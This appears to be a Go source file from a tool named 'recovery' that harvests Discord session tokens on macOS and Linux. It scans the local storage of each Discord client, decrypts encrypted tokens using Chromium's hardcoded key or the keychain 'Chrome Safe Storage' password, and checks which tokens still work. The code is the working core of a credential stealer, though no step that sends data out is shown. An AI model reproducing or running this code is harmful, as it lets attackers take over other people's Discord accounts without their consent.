//go:build !windows

package discord

import (
	"crypto/sha1"
	"encoding/base64"
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"

	"recovery/recovery/crypto"
	"recovery/recovery/platform"

	"golang.org/x/crypto/pbkdf2"
)

func discordConfigDir() string {
	home, _ := os.UserHomeDir()
	if runtime.GOOS == "darwin" {
		return filepath.Join(home, "Library", "Application Support")
	}
	xdg := os.Getenv("XDG_CONFIG_HOME")
	if xdg != "" {
		return xdg
	}
	return filepath.Join(home, ".config")
}

func discordV10Key(appDir string) []byte {
	data, err := os.ReadFile(filepath.Join(appDir, "Local State"))
	if err != nil {
		if runtime.GOOS == "linux" {
			return pbkdf2.Key([]byte("peanuts"), []byte("saltysalt"), 1, 16, sha1.New)
		}
		if runtime.GOOS == "darwin" {
			return darwinDiscordKey()
		}
		return nil
	}
	var state map[string]interface{}
	if err := json.Unmarshal(data, &state); err != nil {
		return nil
	}
	osCrypt, _ := state["os_crypt"].(map[string]interface{})
	if osCrypt == nil {
		return nil
	}
	encKeyB64, _ := osCrypt["encrypted_key"].(string)
	_ = encKeyB64

	if runtime.GOOS == "linux" {
		return pbkdf2.Key([]byte("peanuts"), []byte("saltysalt"), 1, 16, sha1.New)
	}
	if runtime.GOOS == "darwin" {
		return darwinDiscordKey()
	}
	return nil
}

func darwinDiscordKey() []byte {
	for _, service := range []string{"Chromium Safe Storage", "Chrome Safe Storage"} {
		out, err := exec.Command("security", "find-generic-password", "-wa", service).Output()
		if err != nil {
			continue
		}
		password := strings.TrimSpace(string(out))
		if password != "" {
			return pbkdf2.Key([]byte(password), []byte("saltysalt"), 1003, 16, sha1.New)
		}
	}
	return nil
}

var discordApps = []DiscordApp{
	{"Discord", "discord"},
	{"Discord PTB", "discordptb"},
	{"Discord Canary", "discordcanary"},
	{"Discord Dev", "discorddevelopment"},
}

func readDiscordFile(path string, pids []uint32) ([]byte, error) {
	return platform.ReadLockedFile(path, pids)
}

func ExtractTokens() []TokenResult {
	configDir := discordConfigDir()

	type candidate struct {
		token  string
		source string
	}

	seen := make(map[string]struct{})
	var candidates []candidate

	for _, app := range discordApps {
		appDir := filepath.Join(configDir, app.Dir)
		leveldb := filepath.Join(appDir, "Local Storage", "leveldb")

		entries, err := os.ReadDir(leveldb)
		if err != nil {
			continue
		}

		pids, _ := platform.FindProcesses(app.Dir)

		for _, e := range entries {
			if e.IsDir() {
				continue
			}
			ext := strings.ToLower(filepath.Ext(e.Name()))
			if ext != ".log" && ext != ".ldb" {
				continue
			}
			data, err := readDiscordFile(filepath.Join(leveldb, e.Name()), pids)
			if err != nil {
				continue
			}

			for _, m := range TokenRe.FindAll(data, -1) {
				tok := string(m)
				if _, dup := seen[tok]; !dup {
					seen[tok] = struct{}{}
					candidates = append(candidates, candidate{tok, app.Name})
				}
			}

			for _, m := range EncRe.FindAll(data, -1) {
				raw := string(m)
				colonIdx := strings.Index(raw, ":")
				if colonIdx < 0 {
					continue
				}
				blob, err := base64.StdEncoding.DecodeString(raw[colonIdx+1:])
				if err != nil {
					continue
				}
				key := discordV10Key(appDir)
				if key == nil {
					continue
				}
				tok := crypto.DecryptChromiumBlob(blob, key, nil)
				if tok == "" || !TokenRe.MatchString(tok) {
					continue
				}
				if _, dup := seen[tok]; !dup {
					seen[tok] = struct{}{}
					candidates = append(candidates, candidate{tok, app.Name})
				}
			}
		}
	}

	if len(candidates) == 0 {
		return nil
	}

	valid := make([]bool, len(candidates))
	var wg sync.WaitGroup
	sem := make(chan struct{}, 6)
	for i, c := range candidates {
		wg.Add(1)
		go func(idx int, tok string) {
			defer wg.Done()
			sem <- struct{}{}
			valid[idx] = CheckToken(tok)
			<-sem
		}(i, c.token)
	}
	wg.Wait()

	var out []TokenResult
	for i, c := range candidates {
		if valid[i] {
			out = append(out, TokenResult{Token: c.token, Source: c.source})
		}
	}
	return out
}
